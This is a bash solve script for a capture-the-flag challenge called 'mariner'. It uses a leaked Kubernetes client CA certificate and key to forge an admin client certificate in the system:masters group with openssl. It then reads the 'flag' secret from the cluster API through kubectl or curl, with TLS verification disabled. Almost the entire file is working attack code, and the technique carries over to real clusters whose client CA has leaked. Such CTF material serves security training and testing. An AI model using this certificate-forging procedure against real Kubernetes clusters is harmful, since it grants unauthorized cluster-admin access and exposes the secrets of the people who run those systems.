#!/bin/bash
# Solve script for "mariner".
#
# The player is given the cluster's client CA (attachments/client-ca.crt and
# attachments/client-ca.key). We forge a client certificate for the Kubernetes
# "system:masters" group, then use it to read the `flag` secret from the API.
#
# Target comes from $HOST/$PORT (set by `pwnmake check`), or $1/$2, else the
# local archive port.
set -euo pipefail

HOST="${1:-${HOST:-127.0.0.1}}"
PORT="${2:-${PORT:-24501}}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CLIENT_CA_CERT="$SCRIPT_DIR/attachments/client-ca.crt"
CLIENT_CA_KEY="$SCRIPT_DIR/attachments/client-ca.key"

WORK="$(mktemp -d)"
trap 'rm -rf "${WORK:?}"' EXIT
cd "$WORK"

# Forge an admin client certificate signed by the leaked client CA.
openssl genrsa -out client.key 2048 2>/dev/null
openssl req -new -key client.key -out client.csr -subj "/CN=system:admin/O=system:masters" 2>/dev/null
openssl x509 -req -in client.csr -CA "$CLIENT_CA_CERT" -CAkey "$CLIENT_CA_KEY" \
    -CAserial "$WORK/ca.srl" -CAcreateserial -out client.crt -days 365 -sha256 2>/dev/null

# Read the `flag` secret straight from the Kubernetes REST API over raw TLS,
# using our forged admin client certificate. (kubectl works too, but curl keeps
# the solver self-contained.)
if command -v kubectl >/dev/null 2>&1; then
    cat > config <<CFG
apiVersion: v1
clusters:
- cluster:
    server: https://${HOST}:${PORT}
    insecure-skip-tls-verify: true
  name: local
contexts:
- context: {cluster: local, namespace: default, user: user}
  name: Default
current-context: Default
kind: Config
users:
- name: user
  user: {client-certificate: client.crt, client-key: client.key}
CFG
    # The API answers before the flag secret is created on a fresh start, so retry briefly.
    for _ in $(seq 1 30); do
        kubectl --kubeconfig=config get secret flag -o jsonpath="{.data.value}" 2>/dev/null | base64 -d && break
        sleep 2
    done
else
    for _ in $(seq 1 30); do
        resp="$(curl -s --cert client.crt --key client.key -k \
            "https://${HOST}:${PORT}/api/v1/namespaces/default/secrets/flag")"
        printf '%s' "$resp" | python3 -c \
            'import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d["data"]["value"]).decode(), end="")' \
            2>/dev/null && break
        sleep 2
    done
fi
echo
